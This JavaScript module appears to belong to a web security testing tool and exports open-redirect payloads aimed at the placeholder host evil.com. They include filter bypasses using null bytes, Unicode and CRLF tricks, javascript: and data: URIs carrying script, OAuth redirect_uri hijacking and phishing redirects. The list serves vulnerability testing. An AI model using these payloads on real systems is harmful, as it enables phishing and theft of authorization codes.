/**
 * Open Redirect Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
 *
 * Categories: basic, advanced, filter_bypass, context_url
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "//evil.com",
        description: "Protocol-relative URL redirect",
        expected_behavior: "Browser interprets // as same protocol, redirects to evil.com"
    },
    {
        type: "basic",
        payload: "https://evil.com",
        description: "Direct absolute URL redirect",
        expected_behavior: "Application redirects to fully qualified external URL"
    },
    {
        type: "basic",
        payload: "http://evil.com",
        description: "HTTP absolute URL redirect",
        expected_behavior: "Redirect to external HTTP URL"
    },
    {
        type: "basic",
        payload: "/\\evil.com",
        description: "Backslash-relative URL redirect",
        expected_behavior: "Some parsers treat /\\ as protocol-relative, redirecting to evil.com"
    },
    {
        type: "basic",
        payload: "////evil.com",
        description: "Multiple-slash protocol-relative redirect",
        expected_behavior: "Browsers normalize //// to //, redirecting to evil.com"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "http://www.target.com@evil.com/",
        description: "Userinfo-based redirect using @ sign (RFC 1738)",
        expected_behavior: "Browser treats target.com as username, connects to evil.com"
    },
    {
        type: "advanced",
        payload: "https:evil.com",
        description: "Scheme without slashes redirect",
        expected_behavior: "Some parsers accept https: without // and redirect to evil.com"
    },
    {
        type: "advanced",
        payload: "//evil.com/%2f%2e%2e",
        description: "Double-encoded path traversal in redirect",
        expected_behavior: "URL decodes to //evil.com//.., browser navigates to evil.com"
    },
    {
        type: "advanced",
        payload: "javascript:alert(document.domain)",
        description: "JavaScript protocol redirect (XSS escalation)",
        expected_behavior: "If used in Location header or link, executes JS in target context"
    },
    {
        type: "advanced",
        payload: "data:text/html,<script>alert(1)</script>",
        description: "Data URI redirect with script injection",
        expected_behavior: "Browser renders data URI as HTML with JS execution"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "//evil%E3%80%82com",
        description: "Dot bypass using Unicode ideographic full stop (%E3%80%82)",
        expected_behavior: "Browser normalizes Unicode period to ASCII dot, redirects to evil.com"
    },
    {
        type: "filter_bypass",
        payload: "//evil%00.com",
        description: "Null byte injection in domain",
        expected_behavior: "Null byte may terminate string comparison in some languages"
    },
    {
        type: "filter_bypass",
        payload: "//google%00.evil.com",
        description: "Null byte after whitelisted domain",
        expected_behavior: "Validator checks 'google', but actual redirect goes to evil.com"
    },
    {
        type: "filter_bypass",
        payload: "www.target.com.evil.com",
        description: "Subdomain suffix append bypass",
        expected_behavior: "Filter validates target.com prefix but DNS resolves to evil.com"
    },
    {
        type: "filter_bypass",
        payload: "?next=whitelisted.com&next=evil.com",
        description: "HTTP Parameter Pollution (HPP) redirect bypass",
        expected_behavior: "Second parameter overrides first if backend takes last occurrence"
    },
    {
        type: "filter_bypass",
        payload: "\\/\\/evil.com/",
        description: "Escaped slashes redirect bypass",
        expected_behavior: "Some parsers un-escape backslashes, producing //evil.com/"
    },
    {
        type: "filter_bypass",
        payload: "java%0d%0ascript%0d%0a:alert(0)",
        description: "CRLF injection to bypass javascript: keyword filter",
        expected_behavior: "CRLF characters break keyword detection while browser still parses javascript:"
    },
    {
        type: "filter_bypass",
        payload: "http://evil.c℀.example.com",
        description: "Unicode normalization — host/split attack",
        expected_behavior: "Unicode char ℀ normalizes to a/c, redirecting to evil.ca/c.example.com"
    },
    {
        type: "filter_bypass",
        payload: "http://a.com／X.b.com",
        description: "Fullwidth slash Unicode bypass",
        expected_behavior: "Fullwidth slash ／ may be normalized to /, changing the path interpretation"
    },
    {
        type: "filter_bypass",
        payload: "http://target.com?http://evil.com/",
        description: "Query string URL confusion",
        expected_behavior: "Browser translates ? to /?, some redirect handlers follow the query URL"
    },

    // ── CONTEXT: URL ───────────────────────────────────────────────────────────
    {
        type: "context_url",
        payload: "/redirect?url=//evil.com",
        description: "Redirect via url parameter",
        expected_behavior: "Common redirect endpoint with protocol-relative external URL"
    },
    {
        type: "context_url",
        payload: "/login?next=https://evil.com",
        description: "Post-login redirect to attacker URL",
        expected_behavior: "After login, user is redirected to attacker-controlled site"
    },
    {
        type: "context_url",
        payload: "/redirect?dest=//evil.com%23.target.com/",
        description: "Fragment injection to fake allowed domain",
        expected_behavior: "# makes .target.com/ appear as fragment, actual redirect goes to evil.com"
    },
    {
        type: "context_url",
        payload: "/oauth/authorize?redirect_uri=https://evil.com/callback",
        description: "OAuth redirect_uri hijack",
        expected_behavior: "OAuth flow sends auth code/token to attacker-controlled callback URL"
    },
    {
        type: "context_url",
        payload: "/signout?returnUrl=http://evil.com/phishing",
        description: "Post-logout redirect to phishing page",
        expected_behavior: "After signing out, user lands on attacker's phishing page"
    },
];

module.exports = {
    vulnerability: "open_redirect",
    name: "Open URL Redirect",
    description: "Payloads for testing unvalidated redirect vulnerabilities including filter bypass techniques",
    payloads,
};
